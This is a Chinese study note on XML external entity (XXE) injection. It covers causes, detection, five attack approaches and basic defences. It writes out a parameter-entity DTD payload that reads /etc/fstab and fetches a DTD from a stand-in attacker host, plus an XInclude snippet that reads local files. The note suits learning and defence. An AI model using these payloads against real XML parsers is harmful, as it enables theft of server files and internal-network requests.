# xxe(xml实体注入)

xml是用来传输和存储数据的标记语言,包含xml声明,dtd文档类型定义(可以选),文档元素

dtd:文档类型定义,可定义合法的xml文档构建模块,使用一系列合法元素定义文档结构

dtd可被成行地声明在xml文档中,也可作为一个外部的引用

**成因** :在应用程序解析xml输入时,没有禁止外部实体的加载,导致可加载恶意外部文件,造成文件读取,命令执行,内网端口扫描,攻击内网网站,发起dos

## 漏洞检测

xxe漏洞触发点是可以上传xml文件的位置有没有对上传的xml文件进行过滤,导致可上传恶意xml文件.

1.检测xml是否会被成功解析

2.检测服务器是否支持dtd引用外部实体

## 攻击和绕过思路

常用有五种攻击思路

1.引用外部实体远程文件读取

2.URL请求(借此发起ssrf)

3.参数实体

4.通过xinclude包含外部资源

5.dos

### 1.外部实体引用

通过外部实体引用,获取远程文件内容

如果文件内容格式过于复杂,会导致xml解析失败(例如文件内容有空格,\<,\>等)

**绕过方式** 

1.使用参数实体 (详见 参数实体)

2.使用php为协议,例如使用php://filter读取文件内容,文件经过base64过滤器,就是全字符的,没有干扰

### 2.URL请求(csrf)

直接使用外部实体引用就可以发起一次请求,原因是很多xml解析器读取到了引用外部文件模块时,会强制性发出请求.

Q:在对xml攻击中,大部分使用外部实体引用,那如在加载xml时禁止外部实体引用呢?

A:大多数攻击会失效,但ssrf不会,因为请求外部资源还有其他方式,比如直接使用DOCTYPE

### 3.Dos

任何能大量占用服务器资源的方法都可以造成dos

可以进行递归引用

### 4.参数实体

参数实体可以绕过文件内容复杂导致解析失败的限制

参数实体以%开头,遵循两条规则 1.参数实体只能在dtd声明中使用;2.参数实体中不能再引用参数实体

example:

/etc/fstab是一个内容复杂的文件,直接使用system请求远程文件会解析出错,读不到文件内容,尝试使用参数实体进行绕过xml语法规则

**流程如下**

1.start 参数实体的内容:<![CDATA[

2.goodies 参数实体的内容:file:///etc/fastab(使用file协议读取文件)

3.end 参数实体的内容:]]>

然后接着定义了一个dtd参数实体,使用system发出获取combine.dtd内容,并在dtd内部引用了dtd参数实体,此时源文件dtd应该是:

```xml-dtd
<!ENTITY% start "<![CDATA[">
<!ENTITY% goodies SYSTEM "file:///etc/fstab">(可以使用其他协议)
<!ENTITY% end "]]">
<!ENTITY% dtd SYSTEM "http://evil.example.com/combine.dtd">
<!ENTITY% all "%start;%goodies;%end;">
```

最后再由源文件中引用all普通实体引发文件读取

这样,参数实体的引用就不需要在xml文档解析时保持xml闭合,xml解释器就会直接忽略文件内容的语法规则,达到绕过目的.

### 5.xinclude包含外部资源

基于xinclude的文件包含,使用的另一套xml语法约束:xml schema

xinclude 提供了一种较为方便的取回数据的思路,不会因为数据不完整导致parser抛出一个错误,我们能够通过parse属性,强制引用文件的类型

但是xinclude需要手动开启,一般xml parser都默认关闭

example:

```xml
<root xmlns:xi="http://www.w3.org/2001/XInclude">
	<xi:include href = "file:///etc/fstab" parse = "text"/>
</root>
```

## 防御姿势

1.直接使用开发语言提供的禁用外部实体的方法(无法防御xml制造的ssrf)

2.过滤用户提交的xml数据:\<!DOCTYPE,\<!ENTITY,SYSTEM,PUBLIC